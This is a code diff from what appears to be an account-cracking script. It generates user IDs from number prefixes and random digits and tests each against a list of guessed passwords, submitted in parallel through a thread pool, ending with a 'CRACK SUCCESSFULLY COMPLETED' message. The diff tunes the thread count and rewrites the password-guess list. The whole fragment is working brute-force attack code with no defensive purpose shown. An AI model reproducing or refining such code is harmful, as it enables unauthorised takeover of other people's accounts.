@@ -188,7 +188,7 @@ def v2():
     for nmbr in range(limit):
         nmp = ''.join(random.choice(string.digits) for _ in range(2))
         user.append(nmp)
-    with ThreadPool(max_workers=90) as akash:
+    with ThreadPool(max_workers=60) as akash:
         os.system('clear')
         print(logo)
         tl = str(len(user))
@@ -197,7 +197,7 @@ def v2():
         print('\x1b[38;5;46m⋆\x1b[38;5;254m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[38;5;50m⋆')
         for guru in user:
             uid = kode+kodex+kod+guru
-            pwx = [kode+kodex+kod+guru,kod+guru,kodex+guru,kode+kodex+kod,'57273200','57575751']
+            pwx = [uid[:6],uid[:8],uid,'57273200','57575751','59039200','57575752']
             akash.submit(rcrack1,uid,pwx,tl)
     print(linex)
     print('\033[1;37m[\033[1;32m~\033[1;37m] CRACK SUCCESSFULLY COMPLETED..')
